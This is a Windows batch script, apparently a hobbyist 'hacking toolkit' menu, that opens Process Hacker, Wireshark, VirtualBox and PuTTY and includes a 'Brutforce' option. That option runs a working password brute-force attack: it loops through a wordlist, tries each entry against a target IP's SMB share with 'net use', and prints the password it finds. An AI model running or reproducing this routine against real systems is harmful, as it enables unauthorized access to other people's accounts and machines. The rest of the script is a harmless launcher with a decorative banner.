@echo off
title TsK - by TaW
chcp 65001 >nul
cd files
color 5
setlocal enabledelayedexpansion

:start
call :banner

:menu
for /f %%A in ('"prompt $H &echo on &for %%B in (1) do rem"') do set BS=%%A
echo.
echo.
echo [38;2;255;255;0m        ╔═(1) Process Hacker 2[0m  
echo [38;2;255;255;0m        ║[0m  
echo [38;2;255;255;0m        ╠══(2) Wireshark[0m  
echo [38;2;255;255;0m        ║[0m  
echo [38;2;255;255;0m        ╠═══(3) Virtualbox[0m  
echo [38;2;255;255;0m        ║[0m
echo [38;2;255;255;0m        ╠═══(4) Putty[0m  
echo [38;2;255;255;0m        ║[0m   
echo [38;2;255;255;0m        ╚╦═══(5) Brutforce[0m  
echo [38;2;255;255;0m         ║[0m  
set /p input=.%BS% [38;2;255;255;0m        ╚══════^>[0m  

if /I "%input%" EQU "1" (
    call :ph2
) else if /I "%input%" EQU "2" (
    start Wireshark.lnk
) else if /I "%input%" EQU "3" (
    start vbox.lnk
) else if /I "%input%" EQU "4" (
    start putty.exe
) else if /I "%input%" EQU "5" (
    call :brf
) else (
    echo Choix invalide. Veuillez réessayer.
    pause
)

cls
goto start

:brf
set /p ip="Enter IP Address: "
set /p user="Enter Username: "
set /p wordlist="Enter Password List: "

set /a count=1
for /f %%a in (%wordlist%) do (
  set pass=%%a
  call :attempt
)
echo Password not Found :(
pause
exit

:success
echo.
echo Password Found! %pass%
net use \\%ip% /d /y >nul 2>&1
pause
exit

:attempt
net use \\%ip% /user:%user% %pass% >nul 2>&1
echo [ATTEMPT %count%] [%pass%]
set /a count=%count%+1
if %errorlevel% EQU 0 goto success

goto :eof
:ph2
start /wait ph2.lnk  & rem Attend la fermeture de Process Hacker 2
goto :eof

:banner
echo.
echo.
echo                     [38;2;255;0;0m__/\\\\\\\\\\\\\\\_____/\\\\\\\\\\\____/\\\________/\\\_        [0m     
echo                     [38;2;255;51;0m _\///////\\\/////____/\\\/////////\\\_\/\\\_____/\\\//__  [0m
echo                     [38;2;255;102;0m _______\/\\\________\//\\\______\///__\/\\\__/\\\//_____      [0m 
echo                     [38;2;255;153;0m  _______\/\\\_________\////\\\_________\/\\\\\\//\\\_____    [0m
echo                     [38;2;255;204;0m   _______\/\\\____________\////\\\______\/\\\//_\//\\\____    [0m
echo                     [38;2;255;204;0m    _______\/\\\_______________\////\\\___\/\\\____\//\\\___   [0m
echo                     [38;2;255;204;0m     _______\/\\\________/\\\______\//\\\__\/\\\_____\//\\\__  [0m
echo                     [38;2;255;204;0m      _______\/\\\_______\///\\\\\\\\\\\/___\/\\\______\//\\\_ [0m
echo                     [38;2;255;204;0m       _______\///__________\///////////_____\///________\///__   [0m
echo                     [38;2;255;204;0m                                                                 TaW-@Ciel-Cm[0m
echo.
goto :eof
